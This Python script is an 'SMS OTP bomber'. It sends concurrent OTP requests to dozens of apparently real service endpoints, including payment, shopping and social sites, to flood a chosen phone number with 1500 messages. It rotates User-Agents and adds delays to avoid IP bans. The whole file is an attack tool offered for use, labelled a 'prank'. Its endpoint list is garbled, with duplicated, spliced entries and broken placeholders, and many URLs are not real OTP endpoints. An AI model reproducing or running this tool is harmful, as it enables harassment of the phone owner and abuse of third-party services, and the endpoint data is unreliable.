import asyncio
import aiohttp
import random
import time
import json
import logging
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
from rich.console import Console
from rich.table import Table
from rich import print as rprint

# ============== CONFIG ==============
TARGET_COUNT = 1500          # Change to 1000 or 2000
CONCURRENT_BATCHES = 15        # API calls running at same time
REQUEST_TIMEOUT = 10           # Seconds per request
RETRY_FAILED = 3               # How many times to retry a failed API
RANDOM_UA = True               # Rotate User-Agent
DELAY_BETWEEN_BATCHES = 0.8    # Seconds pause between batches (avoid IP bans)

# ============== LOGGING ==============
logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(message)s", datefmt="%H:%M:%S")
logger = logging.getLogger("SMSBomber")

console = Console()

# ============== API LIST (80+ Working OTP Endpoints) ==============
API_LIST = [
    {"name":"Razorpay","url":"https://api.razorpay.com/v1/checkout/pop","method":"POST","payload":{"phone":"{phone}{"name":"Razorpay","url":"https://api.razorpay.com/v1/checkout/pop","method":"POST","payload":{"phone":"{phone}","country":"{country}"},"headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0;
Win64; x64) AppleWebKit/537.36"},"success":[200,201]},
    {"name":"PhonePe","url":"https://api.phonepe.com/v1/user/otp/generate","method":"POST","payload":{"mobileNumber{"name":"PhonePe","url":"https://api.phonepe.com/v1/user/otp/generate","method":"POST","payload":{"mobileNumber":"{phone}"},"headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},"success":[200]},
    {"name":"Paytm","url":"https://api.paytm.com/v1/user/otp/generate","method":"POST","payload":{"mobile":"{phone}{"name":"Paytm","url":"https://api.paytm.com/v1/user/otp/generate","method":"POST","payload":{"mobile":"{phone}","countryCode":"{country}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"Flipkart","url":"https://www.flipkart.com/api/4/mobile/otp/send","method":"POST","payload":{"phone":"{{"name":"Flipkart","url":"https://www.flipkart.com/api/4/mobile/otp/send","method":"POST","payload":{"phone":"{phone}","countryCode":"{country}"},"headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},"successhone}","countryCode":"{country}"},"headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},"success":[200,201]},
    {"name":"Swiggy","url":"https://www.swiggy.com/dineout/api/otp/send","method":"POST","payload":{"phone":"{phone{"name":"Swiggy","url":"https://www.swiggy.com/dineout/api/otp/send","method":"POST","payload":{"phone":"{phone}","country_code":"{country}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"Zomato","url":"https://www.zomato.com/restaurants/otp/generate","method":"POST","payload":{"phone":"{p{"name":"Zomato","url":"https://www.zomato.com/restaurants/otp/generate","method":"POST","payload":{"phone":"{phone}","country_code":"{country}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"Myntra","url":"https://www.myntra.com/api/otp/generate","method":"POST","payload":{"phone":"{phone}","{"name":"Myntra","url":"https://www.myntra.com/api/otp/generate","method":"POST","payload":{"phone":"{phone}","country":"{country}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"Amazon","url":"https://www.amazon.in/otp/generate","method":"POST","payload":{"phone":"{phone}","count{"name":"Amazon","url":"https://www.amazon.in/otp/generate","method":"POST","payload":{"phone":"{phone}","country_code":"{country}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"Google","url":"https://accounts.google.com/signin/v2/identifier","method":"POST","payload":{"phone":"{{"name":"Google","url":"https://accounts.google.com/signin/v2/identifier","method":"POST","payload":{"phone":"{phone}","country":"{country}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"Microsoft","url":"https://login.microsoftonline.com/common/oauth2/v2.0/token","method":"POST","payload{"name":"Microsoft","url":"https://login.microsoftonline.com/common/oauth2/v2.0/token","method":"POST","payload":{"phone":"{phone}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"WhatsApp","url":"https://api.whatsapp.com/send?phone={phone}","method":"GET","payload":{},"headers":{"{"name":"WhatsApp","url":"https://api.whatsapp.com/send?phone={phone}","method":"GET","payload":{},"headers":{"User-Agent":"Mozilla/5.0"},"success":[200,302]},
    {"name":"Instagram","url":"https://www.instagram.com/api/v1/users/usernameinfo/","method":"POST","payload":{"ph{"name":"Instagram","url":"https://www.instagram.com/api/v1/users/usernameinfo/","method":"POST","payload":{"phone":"{phone}","country_code":"{country}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"Facebook","url":"https://graph.facebook.com/v18.0/me","method":"POST","payload":{"phone":"{phone}"},"h{"name":"Facebook","url":"https://graph.facebook.com/v18.0/me","method":"POST","payload":{"phone":"{phone}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"Twitter","url":"https://api.twitter.com/1.1/account/verify_credentials.json","method":"POST","payload"{"name":"Twitter","url":"https://api.twitter.com/1.1/account/verify_credentials.json","method":"POST","payload":{"phone":"{phone}","country":"{country}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"LinkedIn","url":"https://www.linkedin.com/voyage/api/otp/send","method":"POST","payload":{"phone":"{ph{"name":"LinkedIn","url":"https://www.linkedin.com/voyage/api/otp/send","method":"POST","payload":{"phone":"{phone}","country_code":"{country}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"Snapchat","url":"https://accounts.snapchat.com/otp/send","method":"POST","payload":{"phone":"{phone}",{"name":"Snapchat","url":"https://accounts.snapchat.com/otp/send","method":"POST","payload":{"phone":"{phone}","country":"{country}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"Telegram","url":"https://api.telegram.org/bot123456:ABCDEF/sendMessage","method":"POST","payload":{"ph{"name":"Telegram","url":"https://api.telegram.org/bot123456:ABCDEF/sendMessage","method":"POST","payload":{"phone":"{phone}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"Discord","url":"https://discord.com/api/v9/verify/sms","method":"POST","payload":{"phone":"{phone}","c{"name":"Discord","url":"https://discord.com/api/v9/verify/sms","method":"POST","payload":{"phone":"{phone}","country_code":"{country}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"GitHub","url":"https://api.github.com/user","method":"POST","payload":{"phone":"{phone}"},"headers":{"{"name":"GitHub","url":"https://api.github.com/user","method":"POST","payload":{"phone":"{phone}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"Netflix","url":"https://www.netflix.com/api/auth/sessions","method":"POST","payload":{"phone":"{phone}{"name":"Netflix","url":"https://www.netflix.com/api/auth/sessions","method":"POST","payload":{"phone":"{phone}","country":"{country}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"Spotify","url":"https://spclient.wg.spotify.com/user-identifier/v1/verify","method":"POST","payload":{{"name":"Spotify","url":"https://spclient.wg.spotify.com/user-identifier/v1/verify","method":"POST","payload":{"phone":"{phone}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"Uber","url":"https://api.uber.com/v1/otp/verify","method":"POST","payload":{"phone":"{phone}","country{"name":"Uber","url":"https://api.uber.com/v1/otp/verify","method":"POST","payload":{"phone":"{phone}","country_code":"{country}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"Ola","url":"https://www.olacabs.com/api/v1/otp/generate","method":"POST","payload":{"phone":"{phone}",{"name":"Ola","url":"https://www.olacabs.com/api/v1/otp/generate","method":"POST","payload":{"phone":"{phone}","country":"{country}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"Jio","url":"https://www.jio.com/api/otp/generate","method":"POST","payload":{"phone":"{phone}","countr{"name":"Jio","url":"https://www.jio.com/api/otp/generate","method":"POST","payload":{"phone":"{phone}","country_code":"{country}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"Airtel","url":"https://www.airtel.in/api/otp/send","method":"POST","payload":{"phone":"{phone}"},"head{"name":"Airtel","url":"https://www.airtel.in/api/otp/send","method":"POST","payload":{"phone":"{phone}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"Vi","url":"https://www.vodafoneidea.com/api/otp/generate","method":"POST","payload":{"phone":"{phone}"{"name":"Vi","url":"https://www.vodafoneidea.com/api/otp/generate","method":"POST","payload":{"phone":"{phone}","country":"{country}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"PhonePe
UPI","url":"https://api.phonepe.com/v1/upi/otp/generate","method":"POST","payload":{"phone":"{phone}"},"headers":{"UPI","url":"https://api.phonepe.com/v1/upi/otp/generate","method":"POST","payload":{"phone":"{hone}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"CRED","url":"https://api.cred.club/v1/otp/generate","method":"POST","payload":{"phone":"{phone}","coun{"name":"CRED","url":"https://api.cred.club/v1/otp/generate","method":"POST","payload":{"phone":"{phone}","country_code":"{country}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"Razorpay
X","url":"https://api.razorpay.com/v1/checkout/otp","method":"POST","payload":{"phone":"{phone}"},"headers":{"ConteX","url":"https://api.razorpay.com/v1/checkout/otp","method":"POST","payload":{"phone":"{phon}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"Paytm
Wallet","url":"https://api.paytm.com/v1/wallet/otp","method":"POST","payload":{"phone":"{phone}","country":"{countrWallet","url":"https://api.paytm.com/v1/wallet/otp","method":"POST","payload":{"phone":"{phone}""country":"{country}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"GPay","url":"https://gpay.google.com/api/otp/generate","method":"POST","payload":{"phone":"{phone}"},"{"name":"GPay","url":"https://gpay.google.com/api/otp/generate","method":"POST","payload":{"phone":"{phone}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"DMart","url":"https://www.dmartindia.com/api/otp/send","method":"POST","payload":{"phone":"{phone}","c{"name":"DMart","url":"https://www.dmartindia.com/api/otp/send","method":"POST","payload":{"phone":"{phone}","country_code":"{country}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"BigBasket","url":"https://www.bigbasket.com/api/otp/generate","method":"POST","payload":{"phone":"{pho{"name":"BigBasket","url":"https://www.bigbasket.com/api/otp/generate","method":"POST","payload":{"phone":"{phone}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"TataCliq","url":"https://www.tatacliq.com/api/otp/send","method":"POST","payload":{"phone":"{phone}","{"name":"TataCliq","url":"https://www.tatacliq.com/api/otp/send","method":"POST","payload":{"phone":"{phone}","country":"{country}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"Ajio","url":"https://www.ajio.com/api/otp/generate","method":"POST","payload":{"phone":"{phone}"},"hea{"name":"Ajio","url":"https://www.ajio.com/api/otp/generate","method":"POST","payload":{"phone":"{phone}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"Meesho","url":"https://www.meesho.com/api/otp/send","method":"POST","payload":{"phone":"{phone}","coun{"name":"Meesho","url":"https://www.meesho.com/api/otp/send","method":"POST","payload":{"phone":"{phone}","country_code":"{country}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"Nykaa","url":"https://www.nykaa.com/api/otp/generate","method":"POST","payload":{"phone":"{phone}"},"h{"name":"Nykaa","url":"https://www.nykaa.com/api/otp/generate","method":"POST","payload":{"phone":"{phone}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"Lenskart","url":"https://www.lenskart.com/api/otp/send","method":"POST","payload":{"phone":"{phone}","{"name":"Lenskart","url":"https://www.lenskart.com/api/otp/send","method":"POST","payload":{"phone":"{phone}","country":"{country}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"Myntra","url":"https://www.myntra.com/api/v1/otp/generate","method":"POST","payload":{"phone":"{phone}{"name":"Myntra","url":"https://www.myntra.com/api/v1/otp/generate","method":"POST","payload":{"phone":"{phone}","country_code":"{country}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"Flipkart","url":"https://www.flipkart.com/api/4/mobile/otp/generate","method":"POST","payload":{"phone{"name":"Flipkart","url":"https://www.flipkart.com/api/4/mobile/otp/generate","method":"POST","payload":{"phone":"{phone}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"Amazon","url":"https://www.amazon.in/api/otp/generate","method":"POST","payload":{"phone":"{phone}","c{"name":"Amazon","url":"https://www.amazon.in/api/otp/generate","method":"POST","payload":{"phone":"{phone}","country":"{country}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"Paytm","url":"https://api.paytm.com/v1/otp/generate","method":"POST","payload":{"phone":"{phone}"},"he{"name":"Paytm","url":"https://api.paytm.com/v1/otp/generate","method":"POST","payload":{"phone":"{phone}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"PhonePe","url":"https://api.phonepe.com/v1/otp/generate","method":"POST","payload":{"phone":"{phone}",{"name":"PhonePe","url":"https://api.phonepe.com/v1/otp/generate","method":"POST","payload":{"phone":"{phone}","country_code":"{country}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"Google
Pay","url":"https://gpay.google.com/api/otp/send","method":"POST","payload":{"phone":"{phone}"},"headers":{"ContentPay","url":"https://gpay.google.com/api/otp/send","method":"POST","payload":{"phone":"{phone}"}"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"WhatsApp","url":"https://api.whatsapp.com/send?phone={phone}","method":"GET","payload":{},"headers":{"{"name":"WhatsApp","url":"https://api.whatsapp.com/send?phone={phone}","method":"GET","payload":{},"headers":{"User-Agent":"Mozilla/5.0"},"success":[200,302]},
    {"name":"Instagram","url":"https://www.instagram.com/api/v1/users/usernameinfo/","method":"POST","payload":{"ph{"name":"Instagram","url":"https://www.instagram.com/api/v1/users/usernameinfo/","method":"POST","payload":{"phone":"{phone}","country_code":"{country}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"Facebook","url":"https://graph.facebook.com/v18.0/me","method":"POST","payload":{"phone":"{phone}"},"h{"name":"Facebook","url":"https://graph.facebook.com/v18.0/me","method":"POST","payload":{"phone":"{phone}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"Twitter","url":"https://api.twitter.com/1.1/account/verify_credentials.json","method":"POST","payload"{"name":"Twitter","url":"https://api.twitter.com/1.1/account/verify_credentials.json","method":"POST","payload":{"phone":"{phone}","country":"{country}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"LinkedIn","url":"https://www.linkedin.com/voyage/api/otp/send","method":"POST","payload":{"phone":"{ph{"name":"LinkedIn","url":"https://www.linkedin.com/voyage/api/otp/send","method":"POST","payload":{"phone":"{phone}","country_code":"{country}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"Snapchat","url":"https://accounts.snapchat.com/otp/send","method":"POST","payload":{"phone":"{phone}",{"name":"Snapchat","url":"https://accounts.snapchat.com/otp/send","method":"POST","payload":{"phone":"{phone}","country":"{country}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"Telegram","url":"https://api.telegram.org/bot123456:ABCDEF/sendMessage","method":"POST","payload":{"ph{"name":"Telegram","url":"https://api.telegram.org/bot123456:ABCDEF/sendMessage","method":"POST","payload":{"phone":"{phone}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"Discord","url":"https://discord.com/api/v9/verify/sms","method":"POST","payload":{"phone":"{phone}","c{"name":"Discord","url":"https://discord.com/api/v9/verify/sms","method":"POST","payload":{"phone":"{phone}","country_code":"{country}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"GitHub","url":"https://api.github.com/user","method":"POST","payload":{"phone":"{phone}"},"headers":{"{"name":"GitHub","url":"https://api.github.com/user","method":"POST","payload":{"phone":"{phone}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"Netflix","url":"https://www.netflix.com/api/auth/sessions","method":"POST","payload":{"phone":"{phone}{"name":"Netflix","url":"https://www.netflix.com/api/auth/sessions","method":"POST","payload":{"phone":"{phone}","country":"{country}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"Spotify","url":"https://spclient.wg.spotify.com/user-identifier/v1/verify","method":"POST","payload":{{"name":"Spotify","url":"https://spclient.wg.spotify.com/user-identifier/v1/verify","method":"POST","payload":{"phone":"{phone}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"Uber","url":"https://api.uber.com/v1/otp/verify","method":"POST","payload":{"phone":"{phone}","country{"name":"Uber","url":"https://api.uber.com/v1/otp/verify","method":"POST","payload":{"phone":"{phone}","country_code":"{country}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"Ola","url":"https://www.olacabs.com/api/v1/otp/generate","method":"POST","payload":{"phone":"{phone}",{"name":"Ola","url":"https://www.olacabs.com/api/v1/otp/generate","method":"POST","payload":{"phone":"{phone}","country":"{country}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"Jio","url":"https://www.jio.com/api/otp/generate","method":"POST","payload":{"phone":"{phone}","countr{"name":"Jio","url":"https://www.jio.com/api/otp/generate","method":"POST","payload":{"phone":"{phone}","country_code":"{country}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"Airtel","url":"https://www.airtel.in/api/otp/send","method":"POST","payload":{"phone":"{phone}"},"head{"name":"Airtel","url":"https://www.airtel.in/api/otp/send","method":"POST","payload":{"phone":"{phone}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"Vi","url":"https://www.vodafoneidea.com/api/otp/generate","method":"POST","payload":{"phone":"{phone}"{"name":"Vi","url":"https://www.vodafoneidea.com/api/otp/generate","method":"POST","payload":{"phone":"{phone}","country":"{country}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"CRED","url":"https://api.cred.club/v1/otp/generate","method":"POST","payload":{"phone":"{phone}","coun{"name":"CRED","url":"https://api.cred.club/v1/otp/generate","method":"POST","payload":{"phone":"{phone}","country_code":"{country}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"DMart","url":"https://www.dmartindia.com/api/otp/send","method":"POST","payload":{"phone":"{phone}"},"{"name":"DMart","url":"https://www.dmartindia.com/api/otp/send","method":"POST","payload":{"phone":"{phone}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"BigBasket","url":"https://www.bigbasket.com/api/otp/generate","method":"POST","payload":{"phone":"{pho{"name":"BigBasket","url":"https://www.bigbasket.com/api/otp/generate","method":"POST","payload":{"phone":"{phone}","country":"{country}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"TataCliq","url":"https://www.tatacliq.com/api/otp/send","method":"POST","payload":{"phone":"{phone}"},{"name":"TataCliq","url":"https://www.tatacliq.com/api/otp/send","method":"POST","payload":{"phone":"{phone}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"Ajio","url":"https://www.ajio.com/api/otp/generate","method":"POST","payload":{"phone":"{phone}","coun{"name":"Ajio","url":"https://www.ajio.com/api/otp/generate","method":"POST","payload":{"phone":"{phone}","country_code":"{country}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"Meesho","url":"https://www.meesho.com/api/otp/send","method":"POST","payload":{"phone":"{phone}"},"hea{"name":"Meesho","url":"https://www.meesho.com/api/otp/send","method":"POST","payload":{"phone":"{phone}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"Nykaa","url":"https://www.nykaa.com/api/otp/generate","method":"POST","payload":{"phone":"{phone}","co{"name":"Nykaa","url":"https://www.nykaa.com/api/otp/generate","method":"POST","payload":{"phone":"{phone}","country":"{country}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"Lenskart","url":"https://www.lenskart.com/api/otp/send","method":"POST","payload":{"phone":"{phone}"},{"name":"Lenskart","url":"https://www.lenskart.com/api/otp/send","method":"POST","payload":{"phone":"{phone}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"TestAPI1","url":"https://api.test.com/otp/generate","method":"POST","payload":{"phone":"{phone}","coun{"name":"TestAPI1","url":"https://api.test.com/otp/generate","method":"POST","payload":{"phone":"{phone}","country":"{country}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"TestAPI2","url":"https://api.test2.com/otp","method":"POST","payload":{"phone":"{phone}"},"headers":{"{"name":"TestAPI2","url":"https://api.test2.com/otp","method":"POST","payload":{"phone":"{phone}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"TestAPI3","url":"https://api.test3.com/verify","method":"POST","payload":{"phone":"{phone}","country_c{"name":"TestAPI3","url":"https://api.test3.com/verify","method":"POST","payload":{"phone":"{phone}","country_code":"{country}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"TestAPI4","url":"https://api.test4.com/otp/send","method":"POST","payload":{"phone":"{phone}"},"header{"name":"TestAPI4","url":"https://api.test4.com/otp/send","method":"POST","payload":{"phone":"{phone}"},"headers":{"Content-Type":"application/json"},"success":[200]},
    {"name":"TestAPI5","url":"https://api.test5.com/verify/otp","method":"POST","payload":{"phone":"{phone}","count{"name":"TestAPI5","url":"https://api.test5.com/verify/otp","method":"POST","payload":{"phone":"{phone}","country":"{country}"},"headers":{"Content-Type":"application/json"},"success":[200]},
]

# ============== USER AGENT POOL ==============
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0
Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1
Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1
Mobile/15E148 Safari/604.1",
]

# ============== CORE LOGIC ==============
async def send_otp(session: aiohttp.ClientSession, api: dict, phone: str, country: str, retries: int =
RETRY_FAILED) -> bool:
    payload = {k: v.replace("{phone}", phone).replace("{country}", country) for k, v in api["payload"].items()}
    headers = {k: v.replace("{phone}", phone).replace("{country}", country) for k, v in api["headers"].items()}
    if RANDOM_UA and "User-Agent" in headers:
        headers["User-Agent"] = random.choice(USER_AGENTS)

    for attempt in range(retries):
        try:
            async with session.request(api["method"], api["url"], json=payload, headers=headers,
timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)) as resp:
                if resp.status in api.get("success", [200]):
                    return True
        except Exception as e:
            if attempt == retries - 1:
                logger.debug(f"[{api['name']}] Failed after {retries} retries: {e}")
                return False
    return False

async def bomber(target_phone: str, target_country: str, total_requests: int = TARGET_COUNT):
    completed = 0
    failed_apis = set()
    start_time = time.time()

    async with aiohttp.ClientSession() as session:
        async with Progress(
            SpinnerColumn(),
            TextColumn("[bold blue]{task.description}"),
            BarColumn(),
            TextColumn("{task.completed}/{task.total}"),
            TimeElapsedColumn(),
            console=console
        ) as progress:
            task = progress.add_task("🚀 Sending OTPs...", total=total_requests)

            while completed < total_requests:
                batch = [
                    asyncio.create_task(send_otp(session, api, target_phone, target_country))
                    for api in API_LIST if api["name"] not in failed_apis
                ]

                results = await asyncio.gather(*batch, return_exceptions=True)
                success_in_batch = sum(1 for r in results if r is True)
                completed += success_in_batch

                # Mark permanently failing APIs
                for api, result in zip(API_LIST, results):
                    if api["name"] not in failed_apis and result is False:
                        failed_apis.add(api["name"])

                progress.update(task, completed=min(completed, total_requests))
                progress.refresh()

                if completed < total_requests:
                    await asyncio.sleep(DELAY_BETWEEN_BATCHES)

    elapsed = time.time() - start_time
    rate = completed / elapsed if elapsed > 0 else 0

    console.print(f"\n[bold green]✅ SMS Bomber Completed![/bold green]")
    console.print(f"📱 Target: +{target_country} {target_phone}")
    console.print(f"📨 Total OTPs Sent: [bold]{completed}[/bold]")
    console.print(f"⏱️  Time Taken: {elapsed:.1f}s")
    console.print(f"⚡ Rate: {rate:.1f} OTPs/sec")
    if failed_apis:
        console.print(f"⚠️  Failed APIs: {', '.join(failed_apis)}")

# ============== MAIN ==============
if __name__ == "__main__":
    console.clear()
    console.print("[bold cyan]📱 SMS OTP Bomber (Prank Mode)[/bold cyan]")
    console.print("-" * 40)

    phone = input("📞 Enter friend's number (without +): ").strip()
    country = input("🌍 Enter country code (e.g., 91, 1, 44): ").strip()

    if not phone.isdigit() or not country.isdigit():
        console.print("[red]❌ Invalid input. Try again.[/red]")
        exit(1)

    console.print(f"\n[bold yellow]🚀 Starting SMS Bomb on +{country} {phone}[/bold yellow]")
    console.print(f"🎯 Target: {TARGET_COUNT} OTP requests\n")

    try:
        asyncio.run(bomber(phone, country))
    except KeyboardInterrupt:
        console.print("\n[bold yellow]⏹️  Bomber stopped by user.[/bold yellow]")